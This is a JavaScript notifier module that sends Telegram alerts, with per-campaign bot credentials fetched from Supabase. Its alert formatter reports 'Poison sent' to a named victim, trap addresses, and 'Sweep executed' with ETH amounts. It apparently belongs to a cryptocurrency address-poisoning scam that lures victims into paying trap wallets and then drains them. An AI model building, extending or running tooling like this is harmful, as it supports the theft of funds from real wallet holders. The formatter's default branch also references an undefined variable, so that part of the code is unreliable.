import axios from 'axios';
import logger from './logger.js';
import { config } from './config.js';
import { createClient } from '@supabase/supabase-js';

const SUPABASE_URL = process.env.NEXT_PUBLIC_SUPABASE_URL;
const SUPABASE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY; // Use service role for internal

let supabase = null;
if (SUPABASE_URL && SUPABASE_KEY) {
  supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
  console.log('[notifier] Supabase service client initialized');
} else {
  console.warn('[notifier] Supabase service client NOT initialized');
}

async function getUserTelegramConfig(campaignId) {
  console.log(`[notifier] Fetching Telegram config for campaign ${campaignId}`);
  if (!supabase) {
    console.warn('[notifier] No Supabase client, cannot fetch user config');
    return null;
  }
  try {
    const { data: campaign, error } = await supabase
      .from('campaigns')
      .select('user_id')
      .eq('id', campaignId)
      .single();
    if (error || !campaign) {
      console.warn('[notifier] Campaign not found:', error?.message);
      return null;
    }
    const { data: user, error: userError } = await supabase
      .from('users')
      .select('telegram_bot_token, telegram_chat_id')
      .eq('id', campaign.user_id)
      .single();
    if (userError || !user) {
      console.warn('[notifier] User not found:', userError?.message);
      return null;
    }
    console.log(`[notifier] Found Telegram config for user ${campaign.user_id}: token=${user.telegram_bot_token ? 'set' : 'null'}, chatId=${user.telegram_chat_id || 'null'}`);
    return { token: user.telegram_bot_token, chatId: user.telegram_chat_id };
  } catch (err) {
    logger.error(`Failed to fetch Telegram config: ${err.message}`);
    console.error('[notifier] Error fetching config:', err);
    return null;
  }
}

export async function sendAlert(message, level = 'info', campaignId = null) {
  let token = config.telegram.token;
  let chatId = config.telegram.chatId;

  console.log(`[notifier] sendAlert called with campaignId: ${campaignId}`);
  console.log(`[notifier] Global config - token: ${token ? 'set' : 'null'}, chatId: ${chatId || 'null'}`);

  if (campaignId) {
    const userConfig = await getUserTelegramConfig(campaignId);
    if (userConfig && userConfig.token && userConfig.chatId) {
      token = userConfig.token;
      chatId = userConfig.chatId;
      console.log('[notifier] Using user-specific Telegram config');
    } else {
      console.log('[notifier] Falling back to global Telegram config');
    }
  } else {
    console.log('[notifier] No campaignId provided, using global config');
  }

  if (!token || !chatId) {
    logger.warn('Telegram not configured, skipping alert.');
    console.warn('[notifier] Token or Chat ID missing (token:', token ? 'set' : 'null', 'chatId:', chatId || 'null', ')');
    return;
  }

  // Mask the token for logging
  const maskedToken = token.length > 8 ? token.slice(0, 6) + '...' + token.slice(-4) : '***';
  console.log(`[notifier] Sending Telegram alert to chat ${chatId} with token ${maskedToken}`);
  console.log(`[notifier] Message preview: ${message.slice(0, 100)}...`);

  try {
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    // Don't log full URL with token, just the prefix
    console.log(`[notifier] Telegram URL: ${url.replace(token, '***')}`);
    const response = await axios.post(url, {
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML',
    });
    console.log('[notifier] Telegram sent successfully:', response.status);
  } catch (error) {
    // Log full error details including response data
    console.error('[notifier] Telegram error:', error.message);
    if (error.response) {
      console.error('[notifier] Response data:', error.response.data);
      console.error('[notifier] Response status:', error.response.status);
      console.error('[notifier] Response headers:', error.response.headers);
    }
    logger.error(`Failed to send Telegram alert: ${error.message}`);
  }
}

export function formatAlert(type, data) {
  const timestamp = new Date().toISOString();
  let msg = `<b>[${timestamp}]</b>\n`;
  switch (type) {
    case 'poison_success':
      msg += `<b>✅ Poison sent</b>\nVictim: ${data.victim}\nTrap: ${data.trap}\nTX: ${data.txHash}`;
      break;
    case 'poison_fail':
      msg += `<b>❌ Poison failed</b>\nVictim: ${data.victim}\nError: ${data.error}`;
      break;
    case 'sweep':
      msg += `<b>💰 Sweep executed</b>\nTrap: ${data.trap}\nAmount: ${data.amount} ETH\nTX: ${data.txHash}`;
      break;
    case 'error':
      msg += `<b>⚠️ Error</b>\nSource: ${data.source}\nError: ${data.error}`;
      break;
    default:
      msg += message;
  }
  return msg;
}